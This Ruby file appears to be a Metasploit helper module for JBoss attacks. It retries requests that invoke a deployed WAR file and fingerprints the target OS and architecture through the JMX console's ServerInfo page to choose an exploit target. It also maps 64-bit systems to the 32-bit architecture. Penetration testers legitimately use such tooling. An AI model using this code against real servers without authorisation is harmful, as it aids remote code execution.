# -*- coding: binary -*-

module Msf::HTTP::JBoss::Base

  # Deploys a WAR through HTTP uri invoke
  #
  # @param opts [Hash] Hash containing {Exploit::Remote::HttpClient#send_request_cgi} options
  # @param num_attempts [Integer] The number of attempts 
  # @return [Rex::Proto::Http::Response, nil] The {Rex::Proto::Http::Response} response if exists, nil otherwise
  def deploy(opts = {}, num_attempts = 5)
    uri = opts['uri']

    if uri.blank?
      return nil
    end

    # JBoss might need some time for the deployment. Try 5 times at most and
    # wait 5 seconds inbetween tries
    num_attempts.times do |attempt|
      res = send_request_cgi(opts, 5)
      msg = nil
      if res.nil?
        msg = "Execution failed on #{uri} [No Response]"
      elsif res.code == 200
        vprint_status("Successfully called '#{uri}'")
        return res
      else
        msg = "http request failed to #{uri} [#{res.code}]"
      end

      if attempt < num_attempts - 1
        msg << ", retrying in 5 seconds..."
        vprint_status(msg)
        Rex.sleep(5)
      else
        print_error(msg)
        return res
      end
    end
  end

  # Provides the HTTP verb used
  #
  # @return [String] The HTTP verb in use
  def http_verb
    datastore['VERB']
  end


  def auto_target(available_targets)
    if http_verb == 'HEAD' then
      print_status("Sorry, automatic target detection doesn't work with HEAD requests")
    else
      print_status("Attempting to automatically select a target...")
      res = query_serverinfo
      if not (plat = detect_platform(res))
        print_warning('Unable to detect platform!')
        return nil
      end

      if not (arch = detect_architecture(res))
        print_warning('Unable to detect architecture!')
        return nil
      end

      # see if we have a match
      available_targets.each { |t| return t if (t['Platform'] == plat) and (t['Arch'] == arch) }
    end

    # no matching target found, use Java as fallback
    java_targets = available_targets.select {|t| t.name =~ /^Java/ }
    return java_targets[0]
  end

  def query_serverinfo
    path = normalize_uri(target_uri.path.to_s, '/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo')
    res = send_request_raw(
      {
        'uri'    => path,
        'method' => http_verb
      })

    unless res && res.code == 200
      print_error("Failed: Error requesting #{path}")
      return nil
    end

    res
  end

  # Try to autodetect the target platform
  def detect_platform(res)
    if res && res.body =~ /<td.*?OSName.*?(Linux|FreeBSD|Windows).*?<\/td>/m
      os = $1
      if (os =~ /Linux/i)
        return 'linux'
      elsif (os =~ /FreeBSD/i)
        return 'linux'
      elsif (os =~ /Windows/i)
        return 'win'
      end
    end

    nil
  end

  # Try to autodetect the target architecture
  def detect_architecture(res)
    if res && res.body =~ /<td.*?OSArch.*?(x86|i386|i686|x86_64|amd64).*?<\/td>/m
      arch = $1
      if (arch =~ /(x86|i386|i686)/i)
        return ARCH_X86
      elsif (arch =~ /(x86_64|amd64)/i)
        return ARCH_X86
      end
    end

    nil
  end
end
